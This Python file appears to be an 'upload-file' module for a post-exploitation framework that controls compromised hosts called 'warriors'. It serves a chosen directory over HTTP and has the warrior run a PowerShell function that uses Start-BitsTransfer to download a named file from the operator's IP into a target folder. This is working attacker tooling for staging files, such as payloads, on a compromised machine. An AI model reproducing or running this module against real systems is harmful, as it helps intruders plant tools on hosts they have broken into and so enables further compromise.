from termcolor import colored, cprint
from module import Module
from os import getcwd, chdir
from http.server import SimpleHTTPRequestHandler
from threading import Thread
from socketserver import TCPServer


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "upload-file",
                       "Description": "Upload a file",
                       "Author": "@josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "file": [None, "File source", True],
                    "port": [9999, "Port to listen", True],
                    "ip": [None, "Local IP (Where the file is located)", True],
                    "directory": ["/tmp", "directory where the file to be uploaded is located", True],
                    "destination": [None, "Destination folder", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)
    
    def start_server(self):
        try:
            curdir = getcwd()
            chdir(self.args["directory"])
            httpd = TCPServer((self.args["ip"], int(self.args["port"]), SimpleHTTPRequestHandler)
            httpd.serve_forever()
        except Exception as e:
            cprint(e, "red")

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function upload {
                    param(
                            [Parameter(Mandatory)]
                            [string] $source,
                            [Parameter(Mandatory)]
                            [string] $destination
                        )
                        $src = $source
                        if (-not $src.contains('http://')) {
                            $src = 'http://' + $src
                        }
                        try{    
                            Start-BitsTransfer -Source $src -Destination $destination
                        } catch {
                             
                        }

                    }
            """

        function += 'upload -source ' + self.args["ip"] + ":" + str(self.args["port"]) + "/" + self.args["file"] + ' -destination ' + self.args["destination"]
        listener = Thread(target=self.start_server)
        listener.start()
        super(CustomModule, self).run(function)